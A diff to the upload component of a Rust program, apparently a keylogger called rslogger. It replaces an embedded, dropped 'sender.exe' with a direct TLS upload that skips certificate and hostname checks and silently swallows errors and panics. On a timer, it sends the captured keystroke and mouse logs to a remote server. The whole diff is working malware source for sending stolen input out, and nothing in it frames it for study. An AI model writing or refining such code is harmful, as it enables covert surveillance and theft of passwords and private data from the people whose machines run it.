@@ -1,13 +1,11 @@
 use std::fs::File;
-use std::io::Write;
-use std::process::Command;
+use std::io::{Read, Write};
 use std::path::Path;
 use std::time::Duration;
 use std::sync::{Arc, Mutex};
 use std::thread;
-use std::env;
-
-static SENDER_EXE: &[u8] = include_bytes!("sender.exe");
+use std::net::TcpStream;
+use native_tls::TlsConnector;
 
 pub struct UploaderConfig {
     pub server_address: String,
@@ -23,37 +21,73 @@ impl UploaderConfig {
     }
 }
 
-fn extract_sender() -> Result<String, std::io::Error> {
-    let temp_dir = env::temp_dir();
-    let sender_path = temp_dir.join("rslogger_sender.exe");
+pub fn send_file(server_address: &str, file_path: &str) -> bool {
+    // Catch any errors silently
+    let result = std::panic::catch_unwind(|| {
+        send_file_internal(server_address, file_path)
+    });
     
-    if !sender_path.exists() {
-        let mut file = File::create(&sender_path)?;
-        file.write_all(SENDER_EXE)?;
-    }
-    
-    Ok(sender_path.to_str().unwrap().to_string())
+    result.unwrap_or(false)
 }
 
-pub fn send_file(server_address: &str, file_path: &str) -> bool {
+fn send_file_internal(server_address: &str, file_path: &str) -> bool {
     if !Path::new(file_path).exists() {
         return false;
     }
 
-    let sender_path = match extract_sender() {
-        Ok(path) => path,
+    // Extract filename from path
+    let filename = match Path::new(file_path).file_name().and_then(|n| n.to_str()) {
+        Some(name) => name,
+        None => return false,
+    };
+
+    // Read file contents
+    let mut file = match File::open(file_path) {
+        Ok(f) => f,
         Err(_) => return false,
     };
 
-    let result = Command::new(sender_path)
-        .arg(server_address)
-        .arg(file_path)
-        .output();
-
-    match result {
-        Ok(output) => output.status.success(),
-        Err(_) => false,
+    let mut contents = Vec::new();
+    if file.read_to_end(&mut contents).is_err() {
+        return false;
     }
+
+    // Connect with TLS
+    let connector = match TlsConnector::builder()
+        .danger_accept_invalid_certs(true)
+        .danger_accept_invalid_hostnames(true)
+        .build() {
+        Ok(c) => c,
+        Err(_) => return false,
+    };
+
+    let stream = match TcpStream::connect(server_address) {
+        Ok(s) => s,
+        Err(_) => return false,
+    };
+    
+    // Set timeouts
+    let _ = stream.set_read_timeout(Some(Duration::from_secs(10)));
+    let _ = stream.set_write_timeout(Some(Duration::from_secs(10)));
+
+    let mut tls_stream = match connector.connect("localhost", stream) {
+        Ok(s) => s,
+        Err(_) => return false,
+    };
+
+    // Send filename
+    if tls_stream.write_all(format!("{}\n", filename).as_bytes()).is_err() {
+        return false;
+    }
+
+    // Send file contents
+    if tls_stream.write_all(&contents).is_err() {
+        return false;
+    }
+
+    let _ = tls_stream.flush();
+    drop(tls_stream);
+    true
 }
 
 pub fn start_periodic_uploader(config: UploaderConfig, running: Arc<Mutex<bool>>) {
@@ -61,13 +95,25 @@ pub fn start_periodic_uploader(config: UploaderConfig, running: Arc<Mutex<bool>>
         loop {
             thread::sleep(Duration::from_secs(config.send_interval_seconds));
 
-            let should_continue = *running.lock().unwrap();
+            let should_continue = match running.lock() {
+                Ok(guard) => *guard,
+                Err(_) => break,
+            };
+            
             if !should_continue {
                 break;
             }
 
-            send_file(&config.server_address, "keylog.txt");
-            send_file(&config.server_address, "mouselog.txt");
+            let keylog_path = crate::logger::get_keylog_path();
+            let mouselog_path = crate::logger::get_mouselog_path();
+            
+            if let Some(path_str) = keylog_path.to_str() {
+                let _ = send_file(&config.server_address, path_str);
+            }
+            
+            if let Some(path_str) = mouselog_path.to_str() {
+                let _ = send_file(&config.server_address, path_str);
+            }
         }
     });
 }
